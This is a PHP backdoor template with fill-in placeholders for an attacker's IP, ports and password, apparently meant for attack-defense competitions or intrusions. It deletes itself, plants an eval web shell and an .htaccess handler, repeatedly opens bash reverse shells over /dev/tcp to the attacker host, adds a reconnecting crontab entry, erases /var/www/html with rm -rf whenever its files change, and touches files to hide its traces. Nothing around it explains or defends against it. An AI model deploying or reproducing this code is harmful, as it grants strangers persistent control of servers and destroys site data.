<?php ;;; set_time_limit(0);echo "you find nealwe,haha.";

ignore_user_abort(1);

unlink(__FILE__);

$file1 = '/tmp/.log';

$root = "%s";

$file2 = $root.'.config.php';

$file3 = $root.'.htaccess';

$mySwitchip = "%s";

$myWEBip = "%s";

$myPort = "%s";

$myPort2 = $myPort+"1";

$myPassWord = "%s";

$curl = %s;

$md5mySwitchip = md5(md5($mySwitchip));

$md5myPassWord = md5(md5($myPassWord));

$code1 = "<?php @eval(\$_POST['$md5myPassWord']);";

$code2 = "<?php  error_reporting(E_ERROR);  ini_set('display_errors','Off'); define('ROOT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR);require('/tmp/.log');  require( 'protected/core.php' ); require( 'public/core.php' );   ";

$code3 = "SetHandler application/x-httpd-php";

$reserve_bash = "bash -c 'bash -i >/dev/tcp/$myWEBip/$myPort 0>&1'";

$reserve_bash_2 = "bash -c 'bash -i >/dev/tcp/$myWEBip/$myPort2 0>&1'";

$str="echo \"*/1 * * * * while true;do ".$reserve_bash.";sleep 2;$curl;done\" |crontab";

system($str);

system($reserve_bash);

system($reserve_bash_2);

while (1) {



    if (file_get_contents($file1) !== $code1) {

        system("rm -rf /var/www/html/*");

        file_put_contents($file1, $code1);

    }


    if (file_get_contents($file2) !== $code2) {

        system("rm -rf /var/www/html/*");

        file_put_contents($file2 , $code2);

    }

    if (file_get_contents($file3) !== $code3) {

        file_put_contents($file3 , $code3);

    }

    system($str);

    system($reserve_bash);

    system($reserve_bash_2);

    system('find ./../../../* -exec touch {} \;');

    usleep(1000);

}

?>

